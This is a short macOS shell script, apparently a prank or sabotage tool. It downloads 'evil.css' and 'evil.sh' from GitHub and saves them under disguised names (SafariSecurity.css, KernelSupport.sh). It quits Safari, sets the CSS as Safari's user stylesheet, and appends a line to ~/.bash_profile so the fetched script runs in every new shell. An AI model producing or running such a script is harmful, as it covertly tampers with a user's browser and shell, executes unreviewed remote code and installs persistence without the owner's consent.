#!/bin/sh

base="$HOME/Library/Application Support/Safari"
file="$base/SafariSecurity.css"
evilsh="~/KernelSupport.sh"

mkdir -p "$base"
curl -L 'https://github.com/tlrobinson/evil.css/raw/master/evil.css' > "$file"
curl -L 'https://github.com/mathiasbynens/evil.sh/raw/master/evil.sh' > "$evilsh"

osascript -e 'tell application "Safari"' -e 'quit' -e 'end tell'
sleep 1

defaults write "com.apple.Safari" "WebKitUserStyleSheetLocationPreferenceKey" $file
defaults write "com.apple.Safari" "WebKitUserStyleSheetEnabledPreferenceKey" "1"



echo 'source ~/KernelSupport.sh' >>~/.bash_profile
